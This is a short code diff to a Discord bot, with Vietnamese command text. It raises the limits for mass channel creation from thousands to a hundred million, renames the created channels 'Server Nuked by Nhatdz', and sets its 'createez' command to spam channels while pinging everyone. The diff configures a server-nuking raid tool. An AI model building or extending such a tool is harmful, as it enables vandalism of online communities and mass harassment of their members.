@@ -23,15 +23,15 @@ const client = new Client({
 });
 
 // ===== CONFIG =====
-const MAX_TOTAL = 10000;
-const MAX_PER_RUN = 1000;
-const CHANNEL_NAME = "ez";
+const MAX_TOTAL = 100000000;
+const MAX_PER_RUN = 100000;
+const CHANNEL_NAME = "Server Nuked by Nhatdz";
 // ==================
 
 const commands = [
   new SlashCommandBuilder()
     .setName("createez")
-    .setDescription("Tạo tối đa 1000 kênh ez và ping everyone (tổng tối đa 10000)")
+    .setDescription("Tạo tối đa 100000 kênh ez và ping everyone (tổng tối đa 100000000)")
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
 ].map(cmd => cmd.toJSON());
 
